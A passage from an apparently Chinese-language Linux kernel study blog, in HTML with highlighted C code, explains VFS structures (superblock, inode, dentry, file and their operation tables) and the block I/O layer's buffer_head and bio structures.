class="title">s_lock</span>;</span>            <span class="comment">/* 超级块信号量 */</span></span><br><span class="line">    <span class="keyword">int</span>            s_count;                   <span class="comment">/* 超级块引用计数 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">s_inodes</span>;</span>           <span class="comment">/* inode链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mtd_info</span>        *<span class="title">s_mtd</span>;</span>            <span class="comment">/* 存储磁盘信息 */</span></span><br><span class="line">    <span class="keyword">fmode_t</span>            s_mode;                <span class="comment">/* 安装权限 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 其中的 s_op 中定义了超级块的操作方法</span></span><br><span class="line"><span class="comment"> * 这里只介绍一些相对重要的函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_operations</span> &#123;</span></span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *(*<span class="title">alloc_inode</span>)(<span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span>);</span> <span class="comment">/* 创建和初始化一个索引节点对象 */</span></span><br><span class="line">    <span class="keyword">void</span> (*destroy_inode)(struct inode *);                <span class="comment">/* 释放给定的索引节点 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> (*dirty_inode) (struct inode *);                 <span class="comment">/* VFS在索引节点被修改时会调用这个函数 */</span></span><br><span class="line">    <span class="keyword">int</span> (*write_inode) (struct inode *, <span class="keyword">int</span>);             <span class="comment">/* 将索引节点写入磁盘,wait表示写操作是否需要同步 */</span></span><br><span class="line">    <span class="keyword">void</span> (*drop_inode) (struct inode *);                  <span class="comment">/* 最后一个指向索引节点的引用被删除后,VFS会调用这个函数 */</span></span><br><span class="line">    <span class="keyword">void</span> (*delete_inode) (struct inode *);                <span class="comment">/* 从磁盘上删除指定的索引节点 */</span></span><br><span class="line">    <span class="keyword">void</span> (*put_super) (struct super_block *);             <span class="comment">/* 卸载文件系统时由VFS调用,用来释放超级块 */</span></span><br><span class="line">    <span class="keyword">void</span> (*write_super) (struct super_block *);           <span class="comment">/* 用给定的超级块更新磁盘上的超级块 */</span></span><br><span class="line">    <span class="keyword">int</span> (*sync_fs)(struct super_block *sb, <span class="keyword">int</span> wait);     <span class="comment">/* 使文件系统中的数据与磁盘上的数据同步 */</span></span><br><span class="line">    <span class="keyword">int</span> (*statfs) (struct dentry *, struct kstatfs *);    <span class="comment">/* VFS调用该函数获取文件系统状态 */</span></span><br><span class="line">    <span class="keyword">int</span> (*remount_fs) (struct super_block *, <span class="keyword">int</span> *, <span class="keyword">char</span> *); <span class="comment">/* 指定新的安装选项重新安装文件系统时,VFS会调用该函数 */</span></span><br><span class="line">    <span class="keyword">void</span> (*clear_inode) (struct inode *);                 <span class="comment">/* VFS调用该函数释放索引节点,并清空包含相关数据的所有页面 */</span></span><br><span class="line">    <span class="keyword">void</span> (*umount_begin) (struct super_block *);          <span class="comment">/* VFS调用该函数中断安装操作 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><strong>索引节点</strong></p>
+<p>索引节点是 VFS 中的核心概念，它包含内核在操作文件或目录时需要的全部信息</p>
+<ul>
+<li>一个索引节点代表文件系统中的一个文件（Linux 一切皆文件）</li>
+<li>Linux 系统为每一个文件都分配了一个 inode 编号，这个编号中记录了文件相关的一些元信息，通过这些元信息可以用来唯一标识一个文件（操作系统上的 inode 并非无穷无尽，通常在你安装操作系统后，系统上的 inode 数量就已经确定了下来）</li>
+<li>索引节点和超级块一样是实际存储在磁盘上的，当被应用程序访问到时才会在内存中创建</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 索引节点结构中定义的字段非常多</span></span><br><span class="line"><span class="comment"> * 这里只介绍一些重要的属性</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>    <span class="title">i_hash</span>;</span>     <span class="comment">/* 散列表，用于快速查找inode */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_list</span>;</span>        <span class="comment">/* 索引节点链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_sb_list</span>;</span>  <span class="comment">/* 超级块链表超级块  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_dentry</span>;</span>   <span class="comment">/* 目录项链表 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>        i_ino;      <span class="comment">/* 节点号 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span>        i_count;        <span class="comment">/* 引用计数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        i_nlink;    <span class="comment">/* 硬链接数 */</span></span><br><span class="line">    <span class="keyword">uid_t</span>            i_uid;          <span class="comment">/* 使用者id */</span></span><br><span class="line">    <span class="keyword">gid_t</span>            i_gid;          <span class="comment">/* 使用组id */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>        <span class="title">i_atime</span>;</span>    <span class="comment">/* 最后访问时间 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>        <span class="title">i_mtime</span>;</span>    <span class="comment">/* 最后修改时间 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>        <span class="title">i_ctime</span>;</span>    <span class="comment">/* 最后改变时间 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span>    *<span class="title">i_op</span>;</span>  <span class="comment">/* 索引节点操作函数 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>    *<span class="title">i_fop</span>;</span>    <span class="comment">/* 缺省的索引节点操作 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">super_block</span>    *<span class="title">i_sb</span>;</span>              <span class="comment">/* 相关的超级块 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    *<span class="title">i_mapping</span>;</span>     <span class="comment">/* 相关的地址映射 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    <span class="title">i_data</span>;</span>         <span class="comment">/* 设备地址映射 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        i_flags;            <span class="comment">/* 文件系统标志 */</span></span><br><span class="line">    <span class="keyword">void</span>            *i_private;             <span class="comment">/* fs 私有指针 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 其中的 i_op 中定义了索引节点的操作方法</span></span><br><span class="line"><span class="comment"> * 这里只介绍一些相对重要的函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 为dentry对象创造一个新的索引节点 */</span></span><br><span class="line">    <span class="keyword">int</span> (*create) (struct inode *,struct dentry *,<span class="keyword">int</span>, struct nameidata *);</span><br><span class="line">    <span class="comment">/* 在特定文件夹中寻找索引节点,该索引节点要对应于dentry中给出的文件名 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> * (*<span class="title">lookup</span>) (<span class="keyword">struct</span> <span class="title">inode</span> *,<span class="keyword">struct</span> <span class="title">dentry</span> *, <span class="keyword">struct</span> <span class="title">nameidata</span> *);</span></span><br><span class="line">    <span class="comment">/* 创建硬链接 */</span></span><br><span class="line">    <span class="keyword">int</span> (*link) (struct dentry *,struct inode *,struct dentry *);</span><br><span class="line">    <span class="comment">/* 从一个符号链接查找它指向的索引节点 */</span></span><br><span class="line">    <span class="keyword">void</span> * (*follow_link) (struct dentry *, struct nameidata *);</span><br><span class="line">    <span class="comment">/* 在 follow_link 调用之后,该函数由VFS调用进行清除工作 */</span></span><br><span class="line">    <span class="keyword">void</span> (*put_link) (struct dentry *, struct nameidata *, <span class="keyword">void</span> *);</span><br><span class="line">    <span class="comment">/* 该函数由VFS调用,用于修改文件的大小 */</span></span><br><span class="line">    <span class="keyword">void</span> (*truncate) (struct inode *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>接下来看看几种类型的索引结点：</p>
+<ul>
+<li>磁盘索引结点：保存在硬盘中的索引结点</li>
+<li>内存索引结点：保存在内存中的索引结点</li>
+<li>文件结点：用于指向磁盘索引结点的结点（有助于硬链接的实现）</li>
+</ul>
+<p>不管是文件还是目录，[磁盘索引结点] 都需要与 [内存索引结点] 进行“绑定”，这样才可以操控磁盘上的数据，文件被打开时，[磁盘索引结点] 被复制到 [内存索引结点]，以便于使用</p>
+<p><strong>目录项</strong></p>
+<p>目录项不是目录，而是目录的组成部分</p>
+<p>目录项是描述文件的逻辑属性，只存在于内存中，并不是实际存在于磁盘上，更确切的说是存在于内存的目录项缓存，为了提高查找性能而设计：</p>
+<ul>
+<li>在使用的时候在内存中创建目录项对象，其实通过索引节点已经可以定位到指定的文件</li>
+<li>但是索引节点对象的属性非常多，在查找，比较文件时，直接用索引节点效率不高，所以引入了目录项的概念</li>
+</ul>
+<p>路径中的每个部分都是一个目录项</p>
+<ul>
+<li>比如路径：<code>/mnt/cdrom/foo/bar</code> </li>
+<li>其中包含5个目录项：<code>/ mnt cdrom foo bar</code></li>
+</ul>
+<p>每个目录项对象都有3种状态：</p>
+<ul>
+<li>被使用：对应一个有效的索引节点，并且该对象由一个或多个使用者</li>
+<li>未使用：对应一个有效的索引节点，但是VFS当前并没有使用这个目录项</li>
+<li>负状态：没有对应的有效索引节点（可能索引节点被删除或者路径不存在了）</li>
+</ul>
+<p>描述目录项的结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 目录项对象结构 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span> d_count;       <span class="comment">/* 使用计数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> d_flags;   <span class="comment">/* 目录项标识 */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> d_lock;        <span class="comment">/* 单目录项锁 */</span></span><br><span class="line">    <span class="keyword">int</span> d_mounted;          <span class="comment">/* 是否登录点的目录项 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">d_inode</span>;</span>    <span class="comment">/* 相关联的索引节点 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">d_hash</span>;</span>    <span class="comment">/* 散列表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">d_parent</span>;</span>    <span class="comment">/* 父目录的目录项对象 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">qstr</span> <span class="title">d_name</span>;</span>         <span class="comment">/* 目录项名称 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_lru</span>;</span>        <span class="comment">/* 未使用的链表 */</span></span><br><span class="line">    <span class="comment">/* d_child and d_rcu can share memory */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_child</span>;</span>    <span class="comment">/* child of parent list */</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">d_rcu</span>;</span></span><br><span class="line">    &#125; d_u;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_subdirs</span>;</span>    <span class="comment">/* 子目录链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_alias</span>;</span>    <span class="comment">/* 索引节点别名链表 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> d_time;        <span class="comment">/* 重置时间 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> *<span class="title">d_op</span>;</span> <span class="comment">/* 目录项操作相关函数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">d_sb</span>;</span>    <span class="comment">/* 文件的超级块 */</span></span><br><span class="line">    <span class="keyword">void</span> *d_fsdata;            <span class="comment">/* 文件系统特有数据 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> d_iname[DNAME_INLINE_LEN_MIN];    <span class="comment">/* 短文件名 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 目录项相关操作函数 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 该函数判断目录项对象是否有效,VFS准备从dcache中使用一个目录项时会调用这个函数 */</span></span><br><span class="line">    <span class="keyword">int</span> (*d_revalidate)(struct dentry *, struct nameidata *);</span><br><span class="line">    <span class="comment">/* 为目录项对象生成hash值 */</span></span><br><span class="line">    <span class="keyword">int</span> (*d_hash) (struct dentry *, struct qstr *);</span><br><span class="line">    <span class="comment">/* 比较 qstr 类型的2个文件名 */</span></span><br><span class="line">    <span class="keyword">int</span> (*d_compare) (struct dentry *, struct qstr *, struct qstr *);</span><br><span class="line">    <span class="comment">/* 当目录项对象的 d_count 为0时,VFS调用这个函数 */</span></span><br><span class="line">    <span class="keyword">int</span> (*d_delete)(struct dentry *);</span><br><span class="line">    <span class="comment">/* 当目录项对象将要被释放时,VFS调用该函数 */</span></span><br><span class="line">    <span class="keyword">void</span> (*d_release)(struct dentry *);</span><br><span class="line">    <span class="comment">/* 当目录项对象丢失其索引节点时（也就是磁盘索引节点被删除了）,VFS会调用该函数 */</span></span><br><span class="line">    <span class="keyword">void</span> (*d_iput)(struct dentry *, struct inode *);</span><br><span class="line">    <span class="keyword">char</span> *(*d_dname)(struct dentry *, <span class="keyword">char</span> *, <span class="keyword">int</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><strong>文件</strong></p>
+<p>文件对象表示进程已打开的文件，从用户角度来看，我们在代码中操作的就是一个文件对象，它主要从进程的角度描述了一个进程在访问文件时需要了解的文件标识，文件读写的位置，文件引用情况等信息，它的作用范围是某一具体进程</p>
+<ul>
+<li>文件对象反过来指向一个目录项对象（目录项反过来指向一个索引节点）</li>
+</ul>
+<p>其实只有目录项对象才表示一个已打开的实际文件，虽然一个文件对应的文件对象不是唯一的，但其对应的索引节点和目录项对象却是唯一的</p>
+<p>下面是用于描述文件的结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 文件对象结构中定义的字段非常多</span></span><br><span class="line"><span class="comment"> * 这里只介绍一些重要的属性</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">fu_list</span>;</span>    <span class="comment">/* 文件对象链表 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>     <span class="title">fu_rcuhead</span>;</span> <span class="comment">/* 释放之后的RCU链表 */</span></span><br><span class="line">    &#125; f_u;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">path</span>        <span class="title">f_path</span>;</span>             <span class="comment">/* 包含的目录项 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>    *<span class="title">f_op</span>;</span> <span class="comment">/* 文件操作函数 */</span></span><br><span class="line">    <span class="keyword">atomic_long_t</span>        f_count;        <span class="comment">/* 文件对象引用计数 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 其中的 f_op 中定义了文件对象的操作方法</span></span><br><span class="line"><span class="comment"> * 这里只介绍一些相对重要的函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 用于更新偏移量指针,由系统调用lleek()调用它 */</span></span><br><span class="line">    <span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">    <span class="comment">/* 由系统调用read()调用它 */</span></span><br><span class="line">    <span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="comment">/* 由系统调用write()调用它 */</span></span><br><span class="line">    <span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="comment">/* 由系统调用aio_read()调用它 */</span></span><br><span class="line">    <span class="keyword">ssize_t</span> (*aio_read) (struct kiocb *, <span class="keyword">const</span> struct iovec *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">loff_t</span>);</span><br><span class="line">    <span class="comment">/* 由系统调用aio_write()调用它 */</span></span><br><span class="line">    <span class="keyword">ssize_t</span> (*aio_write) (struct kiocb *, <span class="keyword">const</span> struct iovec *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">loff_t</span>);</span><br><span class="line">    <span class="comment">/* 将给定文件映射到指定的地址空间上,由系统调用mmap调用它 */</span></span><br><span class="line">    <span class="keyword">int</span> (*mmap) (struct file *, struct vm_area_struct *);</span><br><span class="line">    <span class="comment">/* 创建一个新的文件对象,并将它和相应的索引节点对象关联起来 */</span></span><br><span class="line">    <span class="keyword">int</span> (*open) (struct inode *, struct file *);</span><br><span class="line">    <span class="comment">/* 当已打开文件的引用计数减少时,VFS调用该函数 */</span></span><br><span class="line">    <span class="keyword">int</span> (*flush) (struct file *, <span class="keyword">fl_owner_t</span> id);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>四个对象之间关系图：</p>
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661438949794.png" class width="1661438949794"> 
+<h2 id="块I-O层"><a href="#块I-O层" class="headerlink" title="块I/O层"></a>块I/O层</h2><p>I/O设备主要有2类：</p>
+<ul>
+<li>字符设备：只能顺序读写设备中的内容（比如：串口设备，键盘）</li>
+<li>块设备：能够随机读写设备中的内容（比如：硬盘，U盘）</li>
+</ul>
+<p>字符设备由于只能顺序访问，因此应用场景也不多，块设备是随机访问的，所以块设备在不同的应用场景中存在很大的优化空间</p>
+<ul>
+<li>块设备的最小寻址单元就是扇区，扇区的大小是2的整数倍，一般是512字节</li>
+<li>扇区是物理上的最小寻址单元，而逻辑上的最小寻址单元是块</li>
+<li>为了便于文件系统管理，块的大小一般是扇区的整数倍，并且小于等于页的大小</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面  sudo fdisk -l</span><br><span class="line">[sudo] yhellow 的密码： </span><br><span class="line">Disk /dev/loop0：<span class="number">4</span> KiB，<span class="number">4096</span> 字节，<span class="number">8</span> 个扇区</span><br><span class="line">单元：扇区 / <span class="number">1</span> * <span class="number">512</span> = <span class="number">512</span> 字节</span><br><span class="line">扇区大小(逻辑/物理)：<span class="number">512</span> 字节 / <span class="number">512</span> 字节</span><br><span class="line">I/O 大小(最小/最佳)：<span class="number">512</span> 字节 / <span class="number">512</span> 字节</span><br></pre></td></tr></table></figure>
+<p><strong>内核访问块设备</strong></p>
+<p>内核通过文件系统访问块设备时，需要先把块读入到内存中，所以文件系统为了管理块设备，必须管理[块]和内存页之间的映射</p>
+<p>内核中有2种方法来管理 [<strong>块</strong>] 和内存页之间的映射：</p>
+<p>一，缓冲区和缓冲区头：</p>
+<ul>
+<li>每个 [<strong>块</strong>] 都是一个缓冲区，同时对每个 [<strong>块</strong>] 都定义一个缓冲区头来描述它</li>
+<li>由于 [<strong>块</strong>] 的大小是小于内存页的大小的，所以每个内存页会包含一个或者多个 [<strong>块</strong>]</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> b_state;            <span class="comment">/* 表示缓冲区状态 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> *<span class="title">b_this_page</span>;</span><span class="comment">/* 当前页中缓冲区 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">b_page</span>;</span>            <span class="comment">/* 当前缓冲区所在内存页 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">sector_t</span> b_blocknr;        <span class="comment">/* 起始块号 */</span></span><br><span class="line">    <span class="keyword">size_t</span> b_size;            <span class="comment">/* buffer在内存中的大小 */</span></span><br><span class="line">    <span class="keyword">char</span> *b_data;            <span class="comment">/* 块映射在内存页中的数据 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">b_bdev</span>;</span> <span class="comment">/* 关联的块设备 */</span></span><br><span class="line">    <span class="keyword">bh_end_io_t</span> *b_end_io;        <span class="comment">/* I/O完成方法 */</span></span><br><span class="line">     <span class="keyword">void</span> *b_private;             <span class="comment">/* 保留的 I/O 完成方法 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">b_assoc_buffers</span>;</span>   <span class="comment">/* 关联的其他缓冲区 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">b_assoc_map</span>;</span>    <span class="comment">/* 相关的地址空间 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span> b_count;                    <span class="comment">/* 引用计数 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>二，bio 结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * I/O操作的主要单元,针对I/O块和更低级的层(ie drivers and stacking drivers)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bio</span> &#123;</span></span><br><span class="line">    <span class="keyword">sector_t</span>        bi_sector;    <span class="comment">/* 磁盘上相关扇区 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bio</span>        *<span class="title">bi_next</span>;</span>    <span class="comment">/* 请求列表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span>    *<span class="title">bi_bdev</span>;</span> <span class="comment">/* 相关的块设备 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>        bi_flags;    <span class="comment">/* 状态和命令标志 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>        bi_rw;        <span class="comment">/* 读还是写 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span>        bi_vcnt;    <span class="comment">/* bio_vecs的数目 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span>        bi_idx;        <span class="comment">/* bio_io_vect的当前索引 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 结合后的片段数目 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_phys_segments;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_size;    <span class="comment">/* 剩余 I/O 计数 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 第一个和最后一个可合并的段的大小 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_seg_front_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_seg_back_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_max_vecs;    <span class="comment">/* bio_vecs数目上限 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        bi_comp_cpu;    <span class="comment">/* 结束CPU */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">atomic_t</span>        bi_cnt;        <span class="comment">/* 使用计数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span>        *<span class="title">bi_io_vec</span>;</span>    <span class="comment">/* bio_vec 链表 */</span></span><br><span class="line">    <span class="keyword">bio_end_io_t</span>        *bi_end_io; <span class="comment">/* I/O 完成方法 */</span></span><br><span class="line">    <span class="keyword">void</span>            *bi_private;    <span 